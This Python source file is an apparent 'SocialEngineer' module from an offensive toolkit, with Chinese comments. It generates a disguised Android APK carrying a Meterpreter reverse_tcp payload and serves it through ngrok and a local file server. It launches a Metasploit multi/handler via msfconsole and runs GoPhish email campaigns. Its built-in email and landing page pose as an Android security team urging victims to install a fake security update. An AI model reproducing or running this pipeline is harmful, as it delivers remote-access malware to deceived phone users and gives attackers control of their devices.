import subprocess
import os
import time
import logging
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socketserver
from core.ngrok_manager import NgrokManager
from core.payload_generator import PayloadGenerator
from core.gophish_client import GoPhishClient

logger = logging.getLogger(__name__)

class SocialEngineer:
    def __init__(self, lhost="0.0.0.0", lport=None, gophish_api_key=None, web_port=None, attacker=None):
        # 从配置文件补全未传入的参数
        import yaml
        try:
            with open('config/config.yaml', 'r', encoding='utf-8') as f:
                _cfg = yaml.safe_load(f)
            _gophish_cfg = _cfg.get('gophish', {})
            _msf_cfg     = _cfg.get('metasploit', {})
            _ngrok_cfg   = _cfg.get('ngrok', {})
        except Exception as e:
            logger.error(f"读取配置文件失败: {e}")
            _gophish_cfg = {}
            _msf_cfg     = {}
            _ngrok_cfg   = {}

        if gophish_api_key is None:
            gophish_api_key = _gophish_cfg.get('api_key', '')
        if lport is None:
            lport = _msf_cfg.get('default_lport', 4444)
        if web_port is None:
            web_port = _ngrok_cfg.get('default_port', 8080)

        _gophish_base_url = _gophish_cfg.get('base_url', 'https://localhost:3333')

        self.lhost = lhost
        self.lport = lport
        self.web_port = web_port
        self.ngrok = NgrokManager()
        self.payload_gen = PayloadGenerator()

        # 初始化 GoPhish 客户端
        if gophish_api_key:
            try:
                self.gophish = GoPhishClient(
                    api_key=gophish_api_key,
                    base_url=_gophish_base_url,
                    verify_ssl=False
                )
                if self.gophish.connected:
                    logger.info("GoPhish客户端初始化成功")
                else:
                    logger.info("GoPhish客户端初始化完成（服务未连接，将在需要时尝试连接）")
            except Exception as e:
                logger.warning(f"GoPhish客户端初始化失败（可能GoPhish服务未启动）: {e}")
                self.gophish = None
        else:
            self.gophish = None
            
        self.attacker = attacker  # 用于会话追踪
        self.file_server = None
        self.server_thread = None
        self.phishing_data = {}
        self.original_dir = os.getcwd()
        self.attack_active = False  # 新增：攻击状态标记

    def create_phishing_attack(self, attack_name="Android Security Update",
                              app_name="System Update", target_emails=None,
                              use_gophish=True, start_listener=True,
                              stealth_level="medium", architecture="arm",
                              gophish_group=None, gophish_template=None,
                              gophish_page=None, gophish_profile=None,
                              use_apktool=False, template_apk=None, disguise_config=None):
        """创建完整的钓鱼攻击（增强版，支持选择已有GoPhish资源和apktool深度伪装）"""
        try:
            logger.info(f"开始创建钓鱼攻击: {attack_name}, 隐身级别: {stealth_level}, 架构: {architecture}")
            logger.info(f"apktool深度伪装: {use_apktool}")
            logger.info(f"使用GoPhish: {use_gophish}")
            
            # 清理之前的资源
            logger.info("清理之前的攻击资源...")
            self._stop_file_server()
            self.ngrok.stop_ngrok()
            
            # 检查 GoPhish 配置
            if use_gophish and not self.gophish:
                logger.warning("GoPhish未配置，将只提供APK下载链接")
                use_gophish = False
            
            # 如果使用GoPhish但未连接，尝试重新连接
            if use_gophish and self.gophish and not self.gophish.connected:
                logger.info("GoPhish未连接，尝试重新连接...")
                self.gophish._test_connection()
                if not self.gophish.connected:
                    logger.warning("GoPhish重新连接失败，将只提供APK下载链接")
                    use_gophish = False
            
            # 1. 生成恶意APK（使用隐身配置、指定架构和apktool深度伪装）
            logger.info("生成恶意APK...")
            if use_apktool and template_apk:
                # 使用apktool进行深度伪装
                logger.info(f"使用apktool深度伪装，模板: {template_apk}")
                payload_result = self.payload_gen.generate_android_payload(
                    lhost=self.lhost,
                    lport=self.lport,
                    app_name=app_name,
                    architecture=architecture,
                    use_apktool=True,
                    template_apk=template_apk,
                    disguise_config=disguise_config,
                    obfuscation_level=1  # 降低混淆级别，确保编译成功
                )
            else:
                # 未选择apktool时，始终使用基础生成，确保回连正常
                payload_result = self.payload_gen.generate_android_payload(
                    lhost=self.lhost,
                    lport=self.lport,
                    app_name=app_name,
                    architecture=architecture
                )
            
            if not payload_result["success"]:
                return payload_result
            
            payload_path = payload_result["payload_path"]
            payload_name = payload_result["payload_name"]
            
            # 2. 启动Ngrok隧道
            logger.info("启动Ngrok隧道...")
            ngrok_url = self.ngrok.start_ngrok(port=self.web_port)
            if not ngrok_url:
                return {"success": False, "error": "Ngrok隧道启动失败"}
            
            # 3. 启动文件服务器
            logger.info("启动文件服务器...")
            if not self._start_file_server():
                return {"success": False, "error": "文件服务器启动失败"}
            
            # 4. 复制APK到文件服务器目录
            logger.info("复制APK到文件服务器目录...")
            payloads_dir = os.path.join(self.original_dir, "payloads")
            if not os.path.exists(payloads_dir):
                os.makedirs(payloads_dir)
            
            # 复制文件（如果源文件和目标文件不同）
            import shutil
            target_path = os.path.join(payloads_dir, payload_name)
            
            # 检查源文件和目标文件是否是同一个文件
            if os.path.abspath(payload_path) != os.path.abspath(target_path):
                logger.info(f"复制APK文件: {payload_path} -> {target_path}")
                shutil.copy2(payload_path, target_path)
            else:
                logger.info(f"APK文件已在目标位置，无需复制: {payload_path}")
            
            # 5. 构建APK下载链接
            apk_url = f"{ngrok_url}/{payload_name}"
            logger.info(f"APK下载链接: {apk_url}")
            
            # 6. 启动MSF监听器（如果需要）
            listener_info = None
            if start_listener:
                logger.info("启动MSF监听器...")
                listener_thread = threading.Thread(target=self._start_msf_listener_in_thread)
                listener_thread.daemon = True
                listener_thread.start()
                listener_info = {"lhost": self.lhost, "lport": self.lport}
            
            # 7. 使用GoPhish创建钓鱼活动（如果需要）
            campaign_info = None
            # 关键修复：当提供了gophish_group（已有用户组ID）时，不再要求target_emails
            if use_gophish and (target_emails or gophish_group):
                logger.info("使用GoPhish创建钓鱼活动...")
                
                # 确定用户组ID
                group_id = None
                if gophish_group:
                    # 使用前端选择的现有组
                    group_id = int(gophish_group)
                    logger.info(f"使用现有组ID: {group_id}")
                elif target_emails:
                    # 使用传入的邮件列表创建新组
                    group_name = f"Android Targets - {int(time.time())}"
                    group_result = self.gophish.create_group(group_name, target_emails)
                    if group_result and isinstance(group_result, dict):
                        group_id = group_result.get('id')
                    elif group_result:
                        group_id = group_result
                    if not group_id:
                        logger.warning("创建目标组失败，将只提供APK下载链接")
                        use_gophish = False
                
                # 确定邮件模板ID
                template_id = None
                if use_gophish:
                    if gophish_template:
                        template_id = int(gophish_template)
                        logger.info(f"使用现有模板ID: {template_id}")
                    else:
                        # 创建新模板
                        template_name = f"Android Security Update - {int(time.time())}"
                        template_result = self.gophish.create_template(
                            template_name,
                            attack_name,  # subject
                            self._generate_email_template(attack_name, apk_url)  # html_content
                        )
                        if template_result and isinstance(template_result, dict):
                            template_id = template_result.get('id')
                        if not template_id:
                            logger.warning("创建邮件模板失败，将只提供APK下载链接")
                            use_gophish = False
                
                # 确定钓鱼页面ID
                page_id = None
                if use_gophish:
                    if gophish_page:
                        page_id = int(gophish_page)
                        logger.info(f"使用现有页面ID: {page_id}")
                    else:
                        page_name = f"Android Update Page - {int(time.time())}"
                        page_result = self.gophish.create_page(page_name, self._generate_landing_page(attack_name, apk_url))
                        if page_result and isinstance(page_result, dict):
                            page_id = page_result.get('id')
                        if not page_id:
                            logger.warning("创建着陆页失败，将只提供APK下载链接")
                            use_gophish = False
                
                # 确定SMTP发送配置ID
                smtp_id = None
                if use_gophish:
                    if gophish_profile:
                        smtp_id = int(gophish_profile)
                        logger.info(f"使用现有发件人配置ID: {smtp_id}")
                    else:
                        # 尝试使用已有的第一个SMTP配置
                        existing_profiles = self.gophish.get_sending_profiles()
                        if existing_profiles and len(existing_profiles) > 0:
                            smtp_id = existing_profiles[0].get('id')
                            logger.info(f"使用已有SMTP配置ID: {smtp_id}")
                        else:
                            logger.warning("没有可用的SMTP发送配置，将只提供APK下载链接")
                            use_gophish = False
                
                # 创建并启动钓鱼活动
                if use_gophish and group_id and template_id and page_id and smtp_id:
                    campaign_name = f"Android Phishing - {int(time.time())}"
                    campaign_result = self.gophish.create_campaign(
                        campaign_name, template_id, page_id, [group_id], ngrok_url, smtp_id
                    )
                    if campaign_result and isinstance(campaign_result, dict):
                        campaign_id = campaign_result.get('id')
                        if campaign_id:
                            # GoPhish在创建campaign时会自动发送邮件，无需额外launch
                            campaign_info = {
                                "id": campaign_id,
                                "name": campaign_name,
                                "status": "Launched",
                                "campaign_data": campaign_result
                            }
                            logger.info(f"钓鱼活动已创建并启动: {campaign_name}, ID: {campaign_id}")
                        else:
                            logger.warning("创建钓鱼活动返回无效数据")
                            use_gophish = False
                    else:
                        logger.warning("创建钓鱼活动失败，将只提供APK下载链接")
                        use_gophish = False
            elif use_gophish:
                logger.warning("未提供目标用户组或邮件列表，GoPhish活动未创建，将只提供APK下载链接")
                use_gophish = False
            
            # 8. 保存攻击数据
            self.phishing_data = {
                "attack_name": attack_name,
                "app_name": app_name,
                "payload_path": payload_path,
                "payload_name": payload_name,
                "apk_url": apk_url,
                "ngrok_url": ngrok_url,
                "listener_info": listener_info,
                "campaign_info": campaign_info,
                "created_at": time.time(),
                "use_gophish": use_gophish,
                "use_apktool": use_apktool,
                "phishing_result": {
                    "phishing_url": ngrok_url,
                    "download_url": apk_url,
                    "type": "gophish" if use_gophish else "direct"
                }
            }
            
            self.attack_active = True  # 标记攻击为活跃状态
            
            logger.info("钓鱼攻击创建成功")
            return {
                "success": True,
                "attack_name": attack_name,
                "app_name": app_name,
                "payload_path": payload_path,
                "payload_name": payload_name,
                "apk_url": apk_url,
                "ngrok_url": ngrok_url,
                "listener_info": listener_info,
                "campaign_info": campaign_info,
                "phishing_url": ngrok_url,  # 添加钓鱼URL
                "download_url": apk_url,  # 添加下载URL
                "message": "钓鱼攻击创建成功！"
            }
            
        except Exception as e:
            logger.error(f"创建钓鱼攻击错误: {e}")
            return {"success": False, "error": str(e)}

    def _start_msf_listener_in_thread(self):
        """在线程中启动MSF监听器"""
        try:
            if self.attacker:
                # 使用attacker的方法，确保会话被正确监控和追踪
                logger.info(f"通过attacker启动MSF监听器在 {self.lhost}:{self.lport}")
                self.attacker.start_msf_listener(
                    payload_type="android/meterpreter/reverse_tcp",
                    lport=self.lport
                )
            else:
                # 降级：独立启动（会话不会被追踪）
                import tempfile
                import subprocess
                rc_content = f"""
            use exploit/multi/handler
            set PAYLOAD android/meterpreter/reverse_tcp
            set LHOST {self.lhost}
            set LPORT {self.lport}
            set ExitOnSession false
            exploit -j -z
            """
                with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                    f.write(rc_content)
                    rc_file = f.name
                logger.info(f"启动MSF监听器在 {self.lhost}:{self.lport}")
                subprocess.Popen(
                    ["msfconsole", "-r", rc_file],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
        except Exception as e:
            logger.error(f"启动MSF监听器错误: {e}")

    def _start_file_server(self):
        """启动文件服务器（改进版，支持大文件下载）"""
        try:
            # 确保payloads目录存在
            payloads_dir = os.path.join(self.original_dir, "payloads")
            if not os.path.exists(payloads_dir):
                os.makedirs(payloads_dir)
            
            # 自定义请求处理器
            class PhishingHTTPRequestHandler(SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    self.original_dir = os.getcwd()
                    payloads_dir = os.path.join(self.original_dir, "payloads")
                    if os.path.exists(payloads_dir):
                        os.chdir(payloads_dir)
                    super().__init__(*args, **kwargs)
                
                def log_message(self, format, *args):
                    client_ip = self.client_address[0]
                    logger.info(f"文件服务器 - {client_ip} - {format % args}")
                
                def do_GET(self):
                    client_ip = self.client_address[0]
                    logger.info(f"HTTP请求: {self.path} from {client_ip}")
                    
                    # 记录APK下载
                    if self.path.endswith('.apk'):
                        logger.info(f"APK下载请求: {self.path} from {client_ip}")
                    
                    # 调用父类方法处理请求
                    try:
                        return super().do_GET()
                    except ConnectionResetError:
                        # 忽略连接重置错误，这是客户端正常中断连接
                        logger.info(f"连接重置（客户端可能中断下载）: {client_ip}")
                    except Exception as e:
                        logger.error(f"处理GET请求错误: {e}")
                
                def finish(self):
                    # 恢复原始目录
                    try:
                        os.chdir(self.original_dir)
                    except:
                        pass
                    super().finish()
            
            # 自定义TCPServer类，允许地址重用
            class ReusableTCPServer(socketserver.TCPServer):
                allow_reuse_address = True
            
            # 启动服务器
            self.file_server = ReusableTCPServer(("", self.web_port), PhishingHTTPRequestHandler)
            
            # 在后台线程中运行服务器
            self.server_thread = threading.Thread(target=self.file_server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            logger.info(f"文件服务器启动在端口 {self.web_port}")
            return True
            
        except Exception as e:
            logger.error(f"文件服务器启动失败: {e}")
            # 恢复原始目录
            try:
                os.chdir(self.original_dir)
            except:
                pass
            return False

    def _stop_file_server(self):
        """停止文件服务器"""
        try:
            if self.file_server:
                self.file_server.shutdown()
                self.file_server.server_close()
                logger.info("文件服务器已停止")
            if self.server_thread:
                self.server_thread.join(timeout=5)
            return True
        except Exception as e:
            logger.error(f"停止文件服务器错误: {e}")
            return False

    def _generate_email_template(self, attack_name, apk_url):
        """生成钓鱼邮件模板"""
        return f"""
        <!DOCTYPE html>
        <html>
        <body>
            <h1>{attack_name}</h1>
            <p>尊敬的用户，</p>
            <p>我们检测到您的Android设备需要进行安全更新。请点击下方链接下载并安装最新的安全补丁。</p>
            <p><a href="{apk_url}">点击这里下载更新</a></p>
            <p>此更新包含重要的安全修复，建议您立即安装。</p>
            <p>如有任何问题，请联系我们的技术支持。</p>
            <p>此致，<br>Android安全团队</p>
        </body>
        </html>
        """

    def _generate_landing_page(self, attack_name, apk_url):
        """生成钓鱼着陆页"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>{attack_name}</title>
            <style>
                body {{ font-family: Arial, sans-serif; padding: 20px; }}
                .container {{ max-width: 600px; margin: 0 auto; }}
                .button {{ display: inline-block; padding: 10px 20px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 4px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>{attack_name}</h1>
                <p>欢迎访问Android安全更新中心</p>
                <p>您的设备需要安装最新的安全补丁。</p>
                <p><a href="{apk_url}" class="button">立即下载更新</a></p>
                <p>文件大小：约10MB</p>
                <p>安装完成后，请重启设备以应用更新。</p>
            </div>
        </body>
        </html>
        """

    def get_phishing_data(self):
        """获取钓鱼攻击数据"""
        return self.phishing_data

    def get_attack_status(self):
        """新增：获取攻击状态"""
        try:
            if not self.attack_active:
                return {
                    "active": False,
                    "message": "没有活跃的钓鱼攻击"
                }
            
            gophish_status = "disabled"
            if self.phishing_data.get("use_gophish"):
                if self.gophish and self.gophish.connected:
                    gophish_status = "connected"
                else:
                    gophish_status = "configured but not connected"
            
            return {
                "active": True,
                "phishing_data": self.phishing_data,
                "gophish_status": gophish_status,
                "file_server_running": self.file_server is not None
            }
        except Exception as e:
            logger.error(f"获取攻击状态错误: {e}")
            return {
                "active": False,
                "error": str(e)
            }

    def stop_phishing_attack(self):
        """新增：停止钓鱼攻击"""
        try:
            if not self.attack_active:
                return True
            
            # 停止文件服务器
            self._stop_file_server()
            
            # 停止Ngrok隧道
            self.ngrok.stop_ngrok()
            
            # 清空攻击数据
            self.phishing_data = {}
            self.attack_active = False
            
            logger.info("钓鱼攻击已停止")
            return True
        except Exception as e:
            logger.error(f"停止钓鱼攻击错误: {e}")
            return False

    def stop_attack(self):
        """停止钓鱼攻击（保留兼容性）"""
        return self.stop_phishing_attack()

    def get_gophish_status(self):
        """获取GoPhish状态"""
        try:
            if self.gophish and self.gophish.connected:
                campaigns = self.gophish.get_campaigns()
                return {
                    "success": True,
                    "connected": True,
                    "campaigns": campaigns
                }
            else:
                return {
                    "success": True,
                    "connected": False,
                    "message": "GoPhish未连接"
                }
        except Exception as e:
            logger.error(f"获取GoPhish状态错误: {e}")
            return {"success": False, "error": str(e)}
